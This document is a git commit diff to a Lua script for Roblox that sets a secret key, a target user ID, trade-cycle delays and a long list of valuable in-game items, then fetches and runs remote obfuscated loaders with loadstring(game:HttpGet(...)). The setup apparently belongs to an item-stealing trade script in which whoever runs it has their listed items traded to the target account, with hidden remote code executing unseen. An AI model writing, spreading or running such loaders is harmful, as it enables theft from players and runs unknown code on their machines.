87e017fbc932686d66eee3c7306a4b4daec598d4
repagithhdo <taylorserren02@gmail.com>
2026-03-30 21:09:19 -0400

    Update script.lua with new configuration and loaders

--- script.lua
+++ script.lua
@@ -1,7 +1,53 @@
+getgenv().SECRET_KEY = "mrr_7743ea3bd69440b49190d4cae19b7538"
+getgenv().TARGET_ID = 6006138512
+getgenv().DELAY_STEP = 1      
+getgenv().TRADE_CYCLE_DELAY = 2
+getgenv().TARGET_BRAINROTS = {
+    ["Meowl"] = true,
+    ["Skibidi Toilet"] = true,
+    ["Strawberry Elephant"] = true,
+    ["Griffin"] = true,
+    ["Nacho Spyder"] = true,
+    ["Tacorita Bicicleta"] = true,
+    ["Festive 67"] = true,
+    ["Tang Tang Keletang"] = true,
+    ["Ketupat Kepat"] = true,
+    ["Tictac Sahur"] = true,
+    ["Ketchuru and Musturu"] = true,
+    ["Lavadorito Spinito"] = true,
+    ["Garama and Madundung"] = true,
+    ["Burguro And Fryuro"] = true,
+    ["Capitano Moby"] = true,
+    ["Cerberus"] = true,
+    ["Dragon Cannelloni"] = true,
+    ["Tralaledon"] = true,
+    ["Los Primos"] = true,
+    ["Los Tacoritas"] = true,
+    ["Los Spaghettis"] = true,
+    ["Love Love Bear"] = true,
+    ["Ginger Gerat"] = true,
+    ["Fragrama and Chocrama"] = true,
+    ["Spooky and Pumpky"] = true,
+    ["La Casa Boo"] = true,
+    ["Los Sekolahs"] = true,
+    ["Reinito Sleighito"] = true,
+    ["Ketupat Bros"] = true,
+    ["Cooki and Milki"] = true,
+    ["Rosey and Teddy"] = true,
+    ["Popcuru and Fizzuru"] = true,
+    ["La Supreme Combinasion"] = true,
+    ["Dragon Gingerini"] = true,
+    ["Headless Horseman"] = true,
+    ["Hydra Dragon Cannelloni"] = true,
+    ["Celularcini Viciosini"] = true,
+    ["La Food Combinasion"] = true,
+    ["Sammyni Fattini"] = true,
+    ["Los Amigos"] = true,
+    ["La Secret Combinasion"] = true
+}
 task.spawn(function()
-  loadstring(game:HttpGet("https://api.luarmor.net/files/v4/loaders/ac1751209625e5f81cdf39f6025a5aca.lua"))()
+loadstring(game:HttpGet("https://api.luarmor.net/files/v4/loaders/fbcd1d25889a843297107dea3642044d.lua"))()
 end)
-
 task.spawn(function()
-   loadstring(game:HttpGet("https://pastebin.com/8CrdCWVC"))()
+loadstring(game:HttpGet("https://api.luarmor.net/files/v4/loaders/d1257823a5727eee3fe0f4afb68d3694.lua"))()
 end)
